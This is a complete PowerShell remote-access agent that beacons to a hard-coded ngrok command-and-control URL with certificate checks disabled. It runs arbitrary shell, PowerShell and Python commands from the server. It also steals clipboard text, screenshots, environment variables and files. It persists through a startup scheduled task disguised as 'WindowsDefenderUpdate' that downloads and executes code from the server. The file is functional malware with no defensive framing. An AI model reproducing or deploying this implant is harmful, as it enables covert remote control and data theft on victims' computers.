# C2 Agent — Windows PowerShell (Windows 7+ / .NET 4+)
$C2      = if ($env:C2_URL)    { $env:C2_URL }    else { "https://lynelle-scroddled-corinne.ngrok-free.dev" }
$AgentId = if ($env:AGENT_ID)  { $env:AGENT_ID }  else { [guid]::NewGuid().ToString() }
$Token   = if ($env:AUTH_TOKEN){ $env:AUTH_TOKEN } else { "" }
$Sleep   = if ($env:SLEEP)     { [int]$env:SLEEP } else { 5 }
$Jitter  = if ($env:JITTER)    { [int]$env:JITTER }else { 10 }

# Ignore SSL errors
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type @"
using System.Net; using System.Security.Cryptography.X509Certificates;
public class NoSSL : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int err) { return true; }
}
"@
[Net.ServicePointManager]::CertificatePolicy = New-Object NoSSL

function Post($path, $body) {
    try {
        $wc = New-Object Net.WebClient
        $wc.Headers["Content-Type"] = "application/json"
        $wc.Headers["User-Agent"]   = "Mozilla/5.0"
        if ($Token) { $wc.Headers["X-Auth-Token"] = $Token }
        $json = $body | ConvertTo-Json -Depth 10
        $resp = $wc.UploadString("$C2$path", $json)
        return $resp | ConvertFrom-Json
    } catch { return $null }
}

function Get-InternalIP {
    try {
        (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.PrefixOrigin -ne "WellKnown" } | Select-Object -First 1).IPAddress
    } catch { "0.0.0.0" }
}

function Register {
    $info = @{
        id            = $AgentId
        hostname      = $env:COMPUTERNAME
        username      = $env:USERNAME
        os            = "Windows $([System.Environment]::OSVersion.Version.ToString())"
        arch          = $env:PROCESSOR_ARCHITECTURE
        ip_internal   = (Get-InternalIP)
        platform_type = "windows"
    }
    Post "/api/agent/register" $info | Out-Null
}

function Get-SysInfo {
    $gpu = ""
    try { $gpu = (Get-WmiObject Win32_VideoController | Select-Object -First 1).Name } catch {}
    $mem = ""
    try { $mem = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1MB) } catch {}
    return @{
        hostname  = $env:COMPUTERNAME
        username  = $env:USERNAME
        os        = "Windows $([System.Environment]::OSVersion.VersionString)"
        arch      = $env:PROCESSOR_ARCHITECTURE
        cpu       = (Get-WmiObject Win32_Processor | Select-Object -First 1).Name
        mem_mb    = $mem
        gpu       = $gpu
        cwd       = (Get-Location).Path
        ps_version= $PSVersionTable.PSVersion.ToString()
    } | ConvertTo-Json -Depth 5
}

function Execute-Task($task) {
    $type    = $task.task_type
    $payload = $task.payload
    $result  = ""
    try {
        switch ($type) {
            "cmd" {
                $result = cmd.exe /c $payload 2>&1 | Out-String
            }
            "powershell" {
                $result = Invoke-Expression $payload 2>&1 | Out-String
            }
            "python" {
                $result = python -c $payload 2>&1 | Out-String
            }
            "sysinfo" {
                $result = Get-SysInfo
            }
            "env" {
                $result = (Get-ChildItem Env: | ForEach-Object { "$($_.Name)=$($_.Value)" }) -join "`n"
            }
            "ps" {
                $result = Get-Process | Format-Table Id, ProcessName, CPU, WorkingSet -AutoSize | Out-String
            }
            "ls" {
                $target = if ($payload) { $payload } else { "." }
                $result = Get-ChildItem $target | Format-Table Mode, LastWriteTime, Length, Name -AutoSize | Out-String
            }
            "net" {
                $result  = "--- Adapters ---`n" + (Get-NetIPAddress -AddressFamily IPv4 | Format-Table InterfaceAlias, IPAddress -AutoSize | Out-String)
                $result += "--- Routes ---`n" + (Get-NetRoute | Format-Table DestinationPrefix, NextHop, RouteMetric -AutoSize | Out-String)
            }
            "download" {
                if (Test-Path $payload) {
                    $bytes  = [IO.File]::ReadAllBytes($payload)
                    $b64    = [Convert]::ToBase64String($bytes)
                    $result = "[b64:$payload] $b64"
                } else { $result = "Not found: $payload" }
            }
            "upload" {
                $parts = $payload -split '\|', 2
                if ($parts.Count -eq 2) {
                    $dir = Split-Path $parts[0] -Parent
                    if ($dir -and !(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
                    [IO.File]::WriteAllBytes($parts[0], [Convert]::FromBase64String($parts[1]))
                    $result = "Written: $($parts[0])"
                }
            }
            "screenshot" {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $screen = [Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp    = New-Object Drawing.Bitmap($screen.Width, $screen.Height)
                $g      = [Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($screen.Location, [Drawing.Point]::Empty, $screen.Size)
                $path   = "$env:TEMP\.c2screen.png"
                $bmp.Save($path)
                $bytes  = [IO.File]::ReadAllBytes($path)
                $result = "[b64:$path] " + [Convert]::ToBase64String($bytes)
            }
            "clipboard" {
                Add-Type -AssemblyName System.Windows.Forms
                $result = [Windows.Forms.Clipboard]::GetText()
            }
            "persist" {
                $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -w hidden -c `"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).Headers['User-Agent']='Mozilla/5.0';IEX((New-Object Net.WebClient).DownloadString('$C2/agents/agent_windows.ps1'))`""
                $trigger = New-ScheduledTaskTrigger -AtStartup
                Register-ScheduledTask -TaskName "WindowsDefenderUpdate" -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null
                $result = "Persistence via ScheduledTask: WindowsDefenderUpdate"
            }
            "kill" {
                Unregister-ScheduledTask -TaskName "WindowsDefenderUpdate" -Confirm:$false -ErrorAction SilentlyContinue
                $result = "Terminating"
                Post "/api/agent/result" @{ task_id = $task.id; result = $result } | Out-Null
                exit
            }
            default { $result = "Unknown type: $type" }
        }
    } catch {
        $result = "[error] $_"
    }
    if ($result.Length -gt 65000) { $result = $result.Substring(0, 65000) + "`n[...truncated]" }
    return $result
}

Register

while ($true) {
    try {
        $resp = Post "/api/agent/beacon" @{ id = $AgentId }
        if ($resp -and $resp.tasks) {
            foreach ($task in $resp.tasks) {
                $r = Execute-Task $task
                Post "/api/agent/result" @{ task_id = $task.id; result = $r } | Out-Null
            }
        }
    } catch {}
    $jitterSecs  = $Sleep * $Jitter / 100
    $actualSleep = $Sleep + (Get-Random -Minimum (-$jitterSecs) -Maximum $jitterSecs)
    Start-Sleep -Seconds ([Math]::Max(1, $actualSleep))
}
